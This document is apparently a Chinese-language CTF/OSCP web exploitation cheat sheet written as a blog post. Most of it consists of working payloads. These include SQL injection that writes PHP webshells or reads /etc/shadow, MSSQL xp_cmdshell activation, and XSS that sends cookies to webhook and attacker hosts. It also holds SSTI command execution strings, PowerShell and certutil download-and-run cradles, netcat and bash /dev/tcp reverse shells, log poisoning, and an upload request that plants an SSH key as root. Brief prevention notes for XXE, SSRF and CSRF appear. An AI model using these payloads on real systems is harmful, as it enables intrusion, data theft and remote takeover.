---
title: Web Cheat Sheet
tags: [Tools, CTF, Web]

category: "Tools｜CTF"
date: 2024-02-07
---

# Web Cheat Sheet
<!-- more -->
## 解題重點
* `robots.txt`
* 掃port: nmap: `$ sudo apt install net-tools`[NMAP教學](https://blog.gtwang.org/linux/nmap-command-examples-tutorials/)
    * nmap: `$ nmap <url>`
* 封包headers和contents: Wireshark、Browser、BurpSuite
* cookies
* Enum directory/dns

### Information Leak
* [`.DS_Store` - lijiejie/ds_store_exp](https://github.com/lijiejie/ds_store_exp)
* [`gitleak` - denny0223/scrabble](https://github.com/denny0223/scrabble): 確認有無`https://<victim url>/.git/config`
    ```bash
    $ chmod +x scrabble
    $ ./scrabble <url> [directory]
    $ ./scrabble http://example.com/my-project.git/
    ```

### Injection
#### SQLi
##### SQL 基本操作
* MySQL
    ```bash
    $ mysql -u root -p'root' -h <SQL server IP> -P 3306 # 連線
    select version(); # 查版本
    select system_user(); # 查當前使用者
    show databases; # 列資料庫
    use <database_name>; # 使用某個資料庫
    show tables;
    SELECT user, authentication_string FROM mysql.user WHERE user = 'offsec'; # 查密碼
    ```
* MSSQL
    ```bash
    $ impacket-mssqlclient <username>:<password>@<MSSQL IP> -windows-auth # 連線
    SELECT @@version; # 查版本（同時揭露 Windows Server 版本）
    SELECT SYSTEM_USER; # 查看當前使用者
    SELECT name FROM sys.databases; # 列資料庫
    use <database_name>;
    SELECT * FROM <database_name>.information_schema.tables; # 查表
    SELECT * FROM <database_name>.dbo.<table_name>; # 查資料（注意需加 dbo schema）

    # 拿 shell: 前提是 xp_cmdshell 有啟用，設想情境是
    ## 1. 拿到 MSSQL Cred. 之後
    ## 2. 進入 MSSQL 修改 show advanced options 啟用 xp_cmdshell
    EXEC sp_configure 'show advanced options', 1;
    RECONFIGURE;
    EXEC sp_configure 'xp_cmdshell', 1;
    RECONFIGURE;
    EXEC xp_cmdshell 'whoami';
    ```

##### SQLi
* Union-Based: 有兩個前提
    * 欄位數量要一致
    * 每一個欄位的 data type 都要和前一個 database 一樣

    ```sql
    ' ORDER BY 1-- -
    ' ORDER BY 5-- - # 利用數字判斷 columns 數量有多少，如果使用 5 出現 error 就代表該數量的欄位不存在，那就代表 column 數量只有 4 個
    ' UNION SELECT NULL,NULL,NULL,NULL-- - # 利用此方式找出每一個欄位的 data type ，如果出錯就把該欄位換成其他的，之後再一個一個換成 str 或 num
    ' UNION SELECT 1,2,3,4,5-- - 
    ' UNION SELECT user(),version(),database(),4,5-- -
    ' UNION SELECT table_name,2,3,4,5 FROM information_schema.tables WHERE table_schema=database()-- -
    ' UNION SELECT column_name,2,3,4,5 FROM information_schema.columns WHERE table_name='users'-- -
    ' UNION SELECT username,password,3,4,5 FROM users-- -

    # 插入 webshell (MySQL+PHP)
    ## 1. MySQL 使用者有 FILE 權限（能讀寫檔案）
    ## 2. MySQL 的 secure_file_priv 沒有限制寫入路徑（或設為空）
    ## 3. 目標路徑（/var/www/html/tmp/）MySQL 進程有寫入權限
    ## 4. 該檔案不能已存在（INTO OUTFILE 不會覆蓋）
    ' UNION SELECT 1,"<?php system($_GET['cmd']); ?>",3,4,5 INTO OUTFILE '/var/www/html/tmp/shell.php'-- -
    ' UNION SELECT 1,LOAD_FILE('/etc/shadow'),3,4,5-- - # 讀敏感資訊

    ## 如果是其使用其他系統
    -- Linux
    INTO OUTFILE '/var/www/html/tmp/shell.php'

    -- Windows XAMPP
    INTO OUTFILE 'C:/xampp/htdocs/tmp/shell.php'

    -- Windows IIS + PHP
    INTO OUTFILE 'C:/inetpub/wwwroot/shell.php'
    ```
* Error-Based
    ```sql
    ' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT version())))-- -
    ' AND UPDATEXML(1, CONCAT(0x7e, (SELECT user())), 1)-- -
    ' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(version(),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- -
    ```
* Boolean-Based
    ```sql
    ' AND 1=1-- -                          -- 真，頁面正常
    ' AND 1=2-- -                          -- 假，頁面不同
    ' AND SUBSTRING(database(),1,1)='a'-- -
    ' AND SUBSTRING((SELECT password FROM users LIMIT 1),1,1)='e'-- -
    ' AND (SELECT LENGTH(database()))=5-- -
    ' AND ASCII(SUBSTRING(database(),1,1))>100-- -    -- 用二分法加速
    ' AND ASCII(SUBSTRING(database(),1,1))<120-- -
    ```
* Time-Based
    ```sql
    ' AND SLEEP(5)-- -                     -- 確認能注入
    ' AND IF(1=1, SLEEP(5), 0)-- -
    ' AND IF(SUBSTRING(database(),1,1)='a', SLEEP(5), 0)-- -
    ' AND IF(ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))>100, SLEEP(5), 0)-- -
    ```
* 認證繞過
    ```sql
    ' OR 1=1-- -
    ' OR '1'='1
    admin'-- -
    ' OR 1=1 LIMIT 1-- -
    ' OR 1=1#
    ```
* MSSQL 專用（OSCP 常見）
    ```sql
    ' UNION SELECT 1,2,3-- -
    '; EXEC xp_cmdshell('whoami')-- -      -- RCE！
    '; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE-- -  -- 啟用 xp_cmdshell
    ```
* PostgreSQL
    ```sql
    ' UNION SELECT NULL,NULL,NULL-- -      -- 用 NULL 避免型別問題
    '; CREATE TABLE cmd(output text); COPY cmd FROM PROGRAM 'id';-- -
    ```

##### 如何使用 SQLMAP
* [ Day 4 很像走迷宮的sqlmap ](https://ithelp.ithome.com.tw/articles/10202811)
* [SQLmap 基本使用](https://hackmd.io/@bttea/sqlmap_common_parameters) ← 解釋的非常好
    ```bash
    $ sudo apt install sqlmap
    $ sqlmap -u "http://cctv.htb/zm/index.php?view=request&request=event&action=removetag&tid=1" --cookie="<cookie key>=<cookie value>"
    ```
    * 基本必須參數(快速)
        ```bash
        # 只需確認是否可注入，並只顯示 payload 技術與後端技術
        $ sqlmap -u "URL"

        # 獲取資料庫
        $ sqlmap -u "URL" --dbs

        # 獲取資料庫所有 table
        $ sqlmap -u "URL" -D database --tables

        # 獲取指定 table 之欄位
        $ sqlmap -u "URL" -D database -T table --columns

        # 獲取指定 table 之指定欄位資料
        $ sqlmap -u "URL" -D database -T table -C field1,field2 --dump

        # 獲取指定 table 之所有欄位資料(就不要-C而已)
        $ sqlmap -u "URL" -D database -T table --dump

        # 不指定table，直接獲取該指定DB所有資料
        $ sqlmap -u "URL" -D database --dump-all
        ```
    * 常用參數
        ```text
        # 使用隨機選擇的 HTTP User-Agent 標頭值，用於繞過 WAF
        --random-agent

        # POST data 也可注入json，看網站怎送請求，--data "{'a':1,'b':2}" 或者 --data '{"a":1,"b":2}'
        --data "a=1&b=2"

        # 使用情境通常發生在，某些登入後的頁面才有注入點，不加cookie就存取不到該網站，當然也有些網站即使沒登入，但是沒cookie一樣存取不到
        --cookie "SESSION_ID=xxx;abc=xxx;"

        # 使用情境通常是不加的話，可能會被後端或者防火牆攔截等等，如果在header中已經指定User-Agent，就別加--random-agent參數
        --header "User-Agent: Mozilla/5.0 (Windows NT ..."

        # 指定注入參數
        -p par1,par2

        # 跳過注入參數
        --skip par1,par2

        # 指定注入技術，不使用此參數，預設就是全測，有 BEUSTQ
        # boolean error union stacked time inline-queries
        --technique BEQU

        # 指定 union select 的 column 列數，可以手動 fuzzing 出來指定
        --union-cols 5

        # 指定使用union技術時，每個欄位的值是多少
        # 例如，假設已知cols為5，且union select 1,2,3,4,5，2跟5可回顯資料
        # 如果我想指定注入2的位置，可以這樣下
        # --union-values "1,*,3,4,5"
        --union-values "1,*,3,4,5"

        # 指定payload前綴
        --prefix "'"

        # 指定payload後綴
        --suffix "-- a"

        # 顯示注入過程詳細，數字越大越細，(0~6，預設是1，常用是3，手動可注入但SQLmap找不到時，可以設6協助debug)，使用情境通常發生在fuzzing時的注入
        -v 3

        # 指定後端資料庫類型，中間有空格要使用雙引號，如："Microsoft Access"
        --dbms mysql

        # 自動模式，自動選取默認預設選項
        --batch

        # 跳過防火牆檢測測試
        --skip-waf

        # 設定SQLmap注入檢測風險技術，等級1~3，預設1
        # ps. 原本僅使用AND，會變成OR也使用，在某些注入的情境可能會洗到資料庫資料，因此請謹慎使用
        --risk N

        # 設定SQLmap注入檢測層級，預設 1，每個層級的說明如下，有關各個level做了什麼，可以去看原文章
        --level N

        # 讓SQLmap自己爬網頁上的注入點
        --forms

        # 有時候因為TLS/SSL問題會導致sqlmap連不到(但是瀏覽器又可以正常存取)，直接使用此命令即可
        --force-ssl
        ```

#### XXE - [Payload Cheat Sheet](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection)
```html
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd">]>
    <data><ID>&xxe;</ID></data>
```

* 如何預防: 
    * 使用安全配置的 XML parser（如 Java 的 XMLInputFactory 關閉 DTD 與 external entities），因為xxe的攻擊前提在於開啟了不必要的兩個feature，讓attacker可以構造出一組讀取自創的DTD或是外部entity，達成LFI(算是?)
    * 避免不必要的功能開啟
    * 做好輸入驗證和最小權限策略

#### XSS - [CheatSheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)
```javascript
</script><script>
fetch(`/getflag\)
    .then(r=>r.text())
    .then(flag=>location.href=`https://sbk6401.free.beeceptor.com/?f=${flag}`
    )
</script>
```

* 利用XSS把session打到webhook上
    {% raw %}    
    ```javascript?
    window.location=<requestbin.com>/?a+document.cookie
    // or
    fetch("https://webhook.site/699a6563-c9b5-4ad7-adaa-e189c5f78194", { method: 'GET', headers: { 'Cookie': document.cookie } })
    ```
    {% endraw %}

    這個還有其他場景要注意，<span style="background-color: yellow">假設 victim 通不到外網也沒有 python 開 server，那就用 powershell</span>
    ```ps
    > $listener = [System.Net.HttpListener]::new();
    > $listener.Prefixes.Add("http://127.0.0.1:8000/"); # 如果綁 `0.0.0.0`（需提權）→ `$listener.Prefixes.Add("http://+:8000/");` 這樣的話，內網中的其他 Victim 使用 XSS 腳本才會打到目前這一台主機
    > $listener.Start(); Write-Host "[*] Listening on port 8000..."; while ($true) { $ctx = $listener.GetContext(); $req = $ctx.Request; Write-Host "[$(Get-Date -Format 'HH:mm:ss')] $($req.HttpMethod) $($req.Url)" -ForegroundColor Green; Write-Host "  Cookie: $($req.Headers['Cookie'])" -ForegroundColor Yellow; $resp = $ctx.Response; $resp.StatusCode = 200; $body = [Text.Encoding]::UTF8.GetBytes("ok"); $resp.OutputStream.Write($body, 0, $body.Length); $resp.Close() }
    ```


    然後如果 payload 不能有 URL encode，可以寫 `/` 當作路徑的一部分
    ```js
    fetch('http://<內網中我們開 PS 腳本的 IP>:8000/'+document.domain+'/'+Date.now())
    ```

    以下有幾個好用的 Payload
    ```js
    # 簡單測試用
    <a href="javascript:alert(1)">test</a>
    </svgonclick=alert(1)>
    <img src="x" onerror="alert(1)">

    # 想要打到 Webhook ，可以值記看 Network 有沒有真的 request ，有時候會因為 http{s} 的原因而沒有送出
    <math><mtext><table><mglyph><style><!--</style><img src=x onerror=fetch('http://172.21.112.129:8000/123/'+document.domain+'/'+Date.now())>
    <math><mtext><table><mglyph><style><!--</style><img src=x onerror=fetch(`https://172.21.112.129:8443/${document.domain}/${document.cookie}`)>

    # 用 document.location 跳轉(跳轉不受 mixed content 限制)
    <math><mtext><table><mglyph><style><!--</style><img src=x onerror=document.location=`http://172.21.112.129:8000/?d=${document.domain}&c=${document.cookie}`>
    ```

#### [Command Injection - feifei Cheat Sheet](https://lab.feifei.tw/practice/ci/l1.php)

#### SSTI - [Payload Cheat Sheet](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/)
* 先確認是不是真的有這個問題: {% raw %}`{{7*7}}`{% endraw %} → 49
* 用[tplmap](https://github.com/epinna/tplmap)直接打
    ```bash
    $ ./tplmap.py --engine Jinja2 --os-shell -u "http://rescued-float.picoctf.net:56957/announce" -X POST -d "content=bob"
    $ ./tplmap.py --engine pug --os-shell -u "http://h4ck3r.quest:8008/?name=bob"
    ```
* Python(Flask): Jinja2
* Node.js(Express): PUG / EJS
* SSTI Payload: 記得找<span style="background-color: yellow">os.\_wrap_close</span>
    {% raw %}
    ```
    {{().__class__.__base__.__subclasses__()[132].__init__.__globals__['system']('id')}}
    {{self.__init__.__globals__.__builtins__.__import__("os").popen("cat%20Flag.txt").read()}}
    {{().__class__.__bases__[0].__subclasses__()[138].__init__.__globals__['execl']("/bin/cat", "cat", "./flag.txt")}}
    {{().__class__.__bases__[0].__subclasses__()[138].__init__.__globals__['popen']("cat /flag.txt")}}
    {{().__class__.__bases__[0].__subclasses__()[138].__init__.__globals__['execl']("/bin/cat", "cat", file.lower())}}
    {{().__class__.__bases__[0].__subclasses__()[138].__init__.__globals__['spawnl']('P_WAIT', "/bin/cat", "cat", file.lower())}}
    ```

    [](https://onsecurity.io/article/server-side-template-injection-with-jinja2/): 如果`.`, `|`, `_`, `[]`, `|join`這幾個字元是黑名單，可以嘗試用hex
    ```
    {{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('ls')|attr('read')()}}
    ```
    {% endraw %}

#### Command Injection
找到注入點之後可以用以下 payload 判斷對方使用的是哪一個 shell
* 如果是 CMD: 會輸出 `CMD`
    ```bash
    (dir 2>&1 *`|echo CMD);&<# rem #>echo PowerShell
    ```
* 如果是 Powershell 則會輸出 `Powershell`
    ```powershell
    (dir 2>&1 *`|echo CMD);&<# rem #>echo PowerShell
    ```
* 實際範例
    ```bash
    $ curl -X POST --data 'Archive=git%3B(dir%202%3E%261%20*%60%7Cecho%20CMD)%3B%26%3C%23%20rem%20%23%3Eecho%20PowerShell' http://192.168.50.189:8000/archive
    ```
* 上傳 webshell 的 Payload
    * Powershell:
        ```powershell
        $ powershell -c "IEX(New-Object Net.WebClient).DownloadString('http://KALI_IP/powercat.ps1');powercat -c KALI_IP -p 4444 -e cmd"
        ```

        步驟:
        ```bash
        $ cp /usr/share/powershell-empire/empire/server/data/module_source/management/powercat.ps1 .
        $ python -m http.server 80
        ```
        ```bash
        $ nc -nvlp 4444
        ```
        ```bash
        $ curl -X POST --data 'Archive=git%3BIEX%20(New-Object%20System.Net.Webclient).DownloadString(%22http%3A%2F%2F<攻擊者IP>%2Fpowercat.ps1%22)%3Bpowercat%20-c%20<攻擊者IP>%20-p%204444%20-e%20powershell' http://<受害者IP>/archive
        ```
    * CMD: 這個方法不見得有用，因為可能我們
        ```bash
        # 第一次: 下載到一個指定地址
        # certutil -urlcache -split -f http://<攻擊者IP>/nc.exe C:\Windows\Temp\nc.exe
        $ curl -X POST --data 'Archive=git%3Bcertutil%20-urlcache%20-split%20-f%20http%3A%2F%2F<攻擊者IP>%2Fnc.exe%20C%3A%5CWindows%5CTemp%5Cnc.exe' http://<受害者IP>/archive

        # 第二次: 實際執行
        # C:\Windows\Temp\nc.exe -e cmd.exe <攻擊者IP> 4444
        $ curl -X POST --data 'Archive=git%3BC%3A%5CWindows%5CTemp%5Cnc.exe%20-e%20cmd.exe%20<攻擊者IP>%204444' http://<受害者IP>/archive
        ```

### LFI
* 前提: 在 PHP 中需要特別啟用 `allow_url_include`
* 只是能讀取到 victim server 上的 file content，不見得會有價值，需要搭配其他手法，例如
    1. 寫入 webshell 之類的達到 RCE
    2. 利用 PHP 的偽協議達到讀特殊檔案的需求: 有時候，我們從前端頁面看到的內容是已經被 php 執行完的結果，就算查看該頁面的原始碼，也看不到當初 php 寫的東西，這時候就可以利用 php wrapper 讀到最原始的 content

    ```bash
    $ http://victim.io/?page=php://filter/convert.base64-encode/resource=<file path>
    php://filter/convert.base64-encode/resource=<file path> # 把 LFI 指定的檔案轉換成 base64 encode ，用絕對/相對路徑讀資料都可以
    php://filter/resource=<file path> # 測試有無 LFI 弱點
    data://text/plain,<?php%20echo%20system('ls');?> # 嘗試將一個以 URL 編碼的小型 PHP 片段嵌入網頁應用程式的程式碼
    data://text/plain;base64,<base64 encode str>&cmd=ls

    # 如果 WAF 會擋前面提到的 payload ，那就可以做簡單的編碼，讓後端還是可以實際執行
    $ echo -n '<?php echo system($_GET["cmd"]);?>' | base64
    PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==
    $ curl "http://mountaindesserts.local/meteor/index.php?page=data://text/plain;base64,PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==&cmd=ls"
    ```

    以下展示，可以看到原本沒有使用 base64 convert 讀到的 admin.php 只顯示最基本的資訊，但透過 PHP wrapper 可以讀到更多，包含後端帳密
    ```bash
    kali@kali:~$ curl http://mountaindesserts.local/meteor/index.php?page=php://filter/resource=admin.php
    ...
    The admin page is currently under maintenance.
    kali@kali:~$ curl http://mountaindesserts.local/meteor/index.php?page=php://filter/convert.base64-encode/resource=admin.php
    ...
    PCFET0NUWVBFIGh0bWw+CjxodG1sIGxhbmc9ImVuIj4KPGhlYWQ+CiAgICA8bWV0YSBjaGFyc2V0PSJVVEYtOCI+CiAgICA8bWV0YSBuYW1lPSJ2aWV3cG9ydCIgY29udGVudD0id2lkdGg9ZGV2aWNlLXdpZHRoLCBpbml0aWFsLXNjYWxlPTEuMCI+CiAgICA8dGl0bGU+TWFpbn...
    dF9lcnJvcik7Cn0KZWNobyAiQ29ubmVjdGVkIHN1Y2Nlc3NmdWxseSI7Cj8+Cgo8L2JvZHk+CjwvaHRtbD4K
    ...
    kali@kali:~$ echo "PCFET0NUWVBFIGh0bWw+CjxodG1sIGxhbmc9ImVuIj4KPGhlYWQ+CiAgICA8bWV0YSBjaGFyc2V0PSJVVEYtOCI+CiAgICA8bWV0YSBuYW1lPSJ2aWV3cG9ydCIgY29udGVudD0id2lkdGg9ZGV2aWNlLXdpZHRoLCBpbml0aWFsLXNjYWxlPTEuMCI+CiAgICA8dGl0bGU+TWFpbnRlbmFuY2U8L3RpdGxlPgo8L2hlYWQ+Cjxib2R5PgogICAgICAgIDw/cGhwIGVjaG8gJzxzcGFuIHN0eWxlPSJjb2xvcjojRjAwO3RleHQtYWxpZ246Y2VudGVyOyI+VGhlIGFkbWluIHBhZ2UgaXMgY3VycmVudGx5IHVuZGVyIG1haW50ZW5hbmNlLic7ID8+Cgo8P3BocAokc2VydmVybmFtZSA9ICJsb2NhbGhvc3QiOwokdXNlcm5hbWUgPSAicm9vdCI7CiRwYXNzd29yZCA9ICJNMDBuSzRrZUNhcmQhMiMiOwoKLy8gQ3JlYXRlIGNvbm5lY3Rpb24KJGNvbm4gPSBuZXcgbXlzcWxpKCRzZXJ2ZXJuYW1lLCAkdXNlcm5hbWUsICRwYXNzd29yZCk7CgovLyBDaGVjayBjb25uZWN0aW9uCmlmICgkY29ubi0+Y29ubmVjdF9lcnJvcikgewogIGRpZSgiQ29ubmVjdGlvbiBmYWlsZWQ6ICIgLiAkY29ubi0+Y29ubmVjdF9lcnJvcik7Cn0KZWNobyAiQ29ubmVjdGVkIHN1Y2Nlc3NmdWxseSI7Cj8+Cgo8L2JvZHk+CjwvaHRtbD4K" | base64 -d
    ...
    <?php
    $servername = "localhost";
    $username = "root";
    $password = "M00nK4keCard!2#";

    // Create connection
    $conn = new mysqli($servername, $username, $password);
    ...
    ```

#### 利用 LFI 拿 reverse shell
* PHP filter + base64（確認能讀檔）
    ```bash
    # 先在 User-Agent 注入 PHP：
    $ curl "http://mountaindesserts.local/meteor/index.php?page=php://filter/convert.base64-encode/resource=index"

    # 然後包含 access log：
    $ curl "http://mountaindesserts.local/meteor/index.php?page=../../../../../var/log/apache2/access.log" # linux 限定
    $ curl "http://mountaindesserts.local/meteor/index.php?page=C:/xampp/apache/logs/access.log" # windows 限定
    ```
* Log poisoning（較常見於 OSCP）
    ```bash
    $ curl -A "<?php system(\$_GET['cmd']); ?>" http://mountaindesserts.local/meteor/index.php

    # 然後包含 access log：
    $ curl "http://mountaindesserts.local/meteor/index.php?page=../../../../../var/log/apache2/access.log&cmd=whoami"
    ```
* php://input 或 data:// wrapper
    ```bash
    $ curl -X POST "http://mountaindesserts.local/meteor/index.php?page=php://input" -d "<?php system('id'); ?>"
    ```

確認 RCE 後，送 reverse shell
```bash
$ nc -lvnp 4444
```
透過 RCE 執行：
```bash
bash -c 'bash -i >& /dev/tcp/<攻擊者IP>/4444 0>&1'
↓
$ curl "http://mountaindesserts.local/meteor/index.php?page=../../../../../var/log/apache2/access.log&cmd=bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F<攻擊者IP>%2F4444%200%3E%261%22" 
```

### RFI
和 LFI 的差別就是， RFI 弱點是可以讀到**外部**的 file，所以我們可以嘗試在 local 端建一個 http server，讓 victim server 連自己的 http server 拿到 webshell 並且實際執行指令
```bash
$ cd /usr/share/webshells/php/ # 先定位在有 webshell 的地方，確保目錄底下有想要上傳的 webshell
$ python3 -m http.server 80 # 建立一個 http server
```

已知 victim server 有 RFI 弱點，就可以讓他連自己的 IP 拿 webshell
```bash
$ curl -k "http://<victim server IP>/meteor/index.php?page=http://<自己的 IP>/simple-backdoor.php&cmd=ls"
```

### Deserialization
要能夠達成insecure的反序列化，最重要的兩個前提是
* 反序列化的資料可控
* 針對各個語言反序列化時或之後會觸發哪些magic method

* 可以搭配command injection
* php可以搭配`phar`
* POP Chain: 幾乎每個語言都會有類似的問題存在，最常出現在 PHP 反序列化漏洞（PHP Object Injection） 裡。把一堆「本來正常的 class 功能」串起來，變成可以執行惡意行為的一條攻擊鏈。
    * [PHPGGC: PHP Generic Gadget Chains](https://github.com/ambionics/phpggc): 可以直接看對應的PHP框架有沒有對應的payload達到RCE
    * [ysoserial](https://github.com/frohoff/ysoserial): 紀錄JAVA版本的POP chain gadgets
    * [ysoserial.net](https://github.com/pwntester/ysoserial.net)

|語言|序列化|反序列化|Magic Method|
|---|---|---|---|
|Python|pickle.dumps()|pickle.loads()|`__reduce`|
|PHP|serialize||unserialize|`__destruct()`: Object被銷毀或garbage collection會觸發<br>`__wakeup()`: unserialize時自動觸發<br>`__call()`: 如果被呼叫一個不存在的方法就會嘗試呼叫，`$obj->note_exist();`<br>`__toString()`: 在被當成String處理時呼叫，`echo $obj;`<br>|
|Java|||`toString`<br>`readObject`<br>`finalize`|
|.NET|||ViewState & Session會存放序列化資料|

### Frontend
攻擊者沒有直接攻擊受害者，而是把惡意程式植入到受害者會瀏覽的網頁，當受害者瀏覽該網頁時，就會自動執行惡意程式，並把受害主機的一些資料送回給駭客，可能是利用[beeceptor](https://beeceptor.com/)這樣的外部server(這是其中一種受害方式，也可能很直接的被盜取`COOKIE`之類的)

### SSRF
create一個偽造的payload和一個對外的中間server溝通，並讓這個中間server因為我的偽造payload而同意讓我和更裡面的內網server溝通，這樣我就打到inner server，如果有preview card這樣的網站要特別注意有沒有SSRF的問題
* 利用gopher協議建一個偽造payload

* 如何預防:
    * 限制可訪問的 URL / IP 範圍(使用whitelist)
    * 避免解析內部 IP → 防止攻擊者透過 URL 指向內網或 localhost (127.0.0.1) 服務。
    * 使用安全的 HTTP client → 設定 timeout、最大連線數、禁用不必要的協議（FTP、file://、gopher:// 等）。
    * 對特殊情境使用代理 / sandbox

### CSRF(Cross-Site Request Frogery)
* [[Day25]- 新手的Web系列CSRF](https://ithelp.ithome.com.tw/articles/10251769)
> 1. 使用者登入網站
> 2. 使用者透過身份驗證在本機形成cookie
> 3. 使用者點擊含有惡意程式的連結，或是直接連結了第三方網站，並瀏覽了帶有以下html程式碼的網頁：`<img src=http://www.***.com/transfer.php?id=5&money=22>`
> 4. 惡意程式碼利用使用者的身份發請求，即執行CSRF
> 5. 使用者的帳號少錢錢勒QQ
>
> ![](https://i.imgur.com/gwCvSqZ.png)
> 
> 常見的CSRF方法
> * HTML標籤
>    * `<img>`標籤屬性
>        ```html
>        <img src="惡意連結">
>        ```
>        以GET方式請求第三方網站，瀏覽器會帶上使用者的cookie發出GET請求
>    
>    * `<script>`標籤屬性
>        ```javascript
>        `<script src="惡意連結">`
>        ```
>    * `<iframe>`標籤屬性
>        ```html
>        `<iframe src="惡意連結">`
>        ```

也就是他和XSS的其中一個目的有點像，那就是偷到使用者的cookie/session，只是方式不同，一個是利用javascript的injection，一個則是利用釣魚或其他的方式迫使使用者**點開**惡意網站，並且冒用使用者的身份對原本使用者正在使用的網站進行各種request，如果該網站沒有對user進行額外的身份驗證，那們光靠user cookie/session就有機會達成轉帳、發文之類的操作

#### 如何預防CSRF
* CSRF Token: 這是最簡單的方式，既然attacker可以透過惡意網站得到victim的cookie，那我就額外在server side多一個驗證token的步驟，而該token無論如何都不會被attacker利用惡意網站得知，就可以確保目前的request是不是本人，而為什麼CSRF token無法被attacker得知呢?核心原因在於 Same-Origin Policy (SOP)。這是瀏覽器的安全機制，規定：
    > JavaScript 或網頁只能讀取**同一來源（protocol + domain + port）**的資源，不能跨域讀取其他網站的內容。

    所以，attacker的惡意網站並不會得知user在a.com這個網域的token，應該說原本就是這樣設計的，所以除非attacker**現場**看到受害者的browser content，才能得知CSRF Token
* SameSite Cookie
    
    就是設定cookie
    > Set-Cookie: sessionid=abc123; SameSite=Strict

    SameSite的效果是跨網站 request 不會帶 cookie，那麼同樣的就算victim點開malicious website，也一樣不會被對方讀取到cookie
* 敏感操作使用 POST

    前面的payload範例有提到很多都是透過GET qeury進行惡意操作，那麼我們只要把敏感操作都利用POST的方式處理，就可以大大降低CSRF發生的情況

### Upload
* 如果沒有任何保護: 直接 upload webshell.php(`<?php system($_GET["sh"]); ?>`)達到RCE
* 改 Extension: 如果有保護但只看 extension : 那就偽造 extension 後夾帶 webshell 達到 RCE (`webshell.png.php`)
* 改 Content-Typebypass: `IMAGETYPE`(加入合法的File Signature) + bypass file type(修改封包header)
* 雙重副檔名: `shell.jsp.jpg`（若 server 解析第一個副檔名）或 `shell.jpg.jsp`
* 如果只能插入在 Image 中，通常會插在 IEND 後面，如果 response 的 Content-Type 不是 `image/png` 而是 `text/html` ，他會執行後面的 webshell payload

#### 利用 Upload + Directory Traversal 上傳 ssh pub key
* 最大的前提是: web server 是以 root 這種高權限運行，在使用自帶 web server 的程式語言（如 Go、Node.js、Python）中很常見，因為開發者或管理員為了省事，直接用 root 啟動應用來避免權限問題。相比之下，傳統的 web server 如 Apache 或 Nginx 通常以低權限使用者（如 www-data）運行，IIS 則用 Network Service 或 Application Pool Identity。這些帳號無法寫入 /root/ 目錄，所以同樣的攻擊就不會成功

1. 先確認上傳的漏洞，使用 `../` 或是 `%2e%2e/` 或 `....//` 可以成功，代表後端沒有驗證，確認有 path traversal
1. 產自己的 ssh key
    ```bash
    $ ssh-keygen -t rsa
    $ cat ~/.ssh/id_rsa.pub
    ssh-rsa AAAAB3Nza...
    ```
2. 在已知有 upload 功能並且有 path traversal 漏洞的情況下，上傳自己的 ssh rsa public key ，在封包中修改
    ```bash
    POST /upload HTTP/1.1
    Host: 192.168.232.16:8000
    User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
    Accept-Language: en-US,en;q=0.5
    Accept-Encoding: gzip, deflate, br
    Content-Type: multipart/form-data; boundary=----geckoformboundary29e1e2328f421e5f75d7ef823f471fd
    Content-Length: 820
    Origin: http://192.168.232.16:8000
    Connection: keep-alive
    Referer: http://192.168.232.16:8000/
    Upgrade-Insecure-Requests: 1
    Priority: u=0, i

    ------geckoformboundary29e1e2328f421e5f75d7ef823f471fd
    Content-Disposition: form-data; name="myFile"; filename="../../../../../root/.ssh/authorized_keys"
    Content-Type: application/octet-stream

    ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDINaM83V9eNyN3e+ZQ2de5qNxWNQ9LHR9+Ki9aNRwX7sm9yWR8xg03FdPIo/Cqn47WV8D+EXMAKmaVU2bw9XbdYqLYT7L3iEO8IJ5w8p+iyBDX+HNUHaF5fTfYJ4eqbfXQhdTo3igceXjjGZwBBaAP0QAISmyH016eA0Duwk4Sny26rG+XSObA0QUupgYc+5J/ZHUq83Q9qlw0gh3N3egZxwoYgekjxX6ddLWkwbKIFhBmUqxfoRi0FWxcSwQlkuMpI7hEqBhXFojdFRmp0mcy1qNupQybXoA57S3G/sW4kyCEQS0ELaWVWokPBNS+02sPoXzXgtWKZhKYMGVBJRY21oIs6ANAT89ivBwer8WqwP+9vlVR3O1AIlSs9KZeqP7yjXHm1I0r4qesa6tHWKHozQCFdEGHvO2o+u/farz7d44bIdO6Hk9NHv9XR/7sqmaLNYQl3FdqyNAQRFB5XnIN4ASiLhgXpHKWcmW+QDZvbZi8+mnd4bMuXTKShxhD5m8= kali@kali
    ------geckoformboundary29e1e2328f421e5f75d7ef823f471fd--
    ```
3. 只要上傳成功，就可以以 root 身份登入
    ```bash
    $ ssh root@192.168.232.16 -p 2222
    root@704d6605d487:~#
    ```

#### JSP
如果是 JSP 系統，有以下幾個 Payload 可以試看看
* 最簡單
    ```java
    <%= Runtime.getRuntime().exec(request.getParameter("cmd")) %>
    ```
* Reverse Shell
    ```java
    <%@ page import="java.io.*" %>
    <%
    String cmd = request.getParameter("cmd");
    if (cmd != null) {
        Process p = Runtime.getRuntime().exec(cmd);
        BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
        String line;
        while ((line = br.readLine()) != null) out.println(line);
    }
    %>
    ```

### Webshell
```bash
$ cp /usr/share/webshells/php/simple-backdoor.php . # php
$ cp /usr/share/webshells/aspx/cmdasp.aspx . # 也可以直接用現成的 webshell
```

### 如果是WordPress網頁
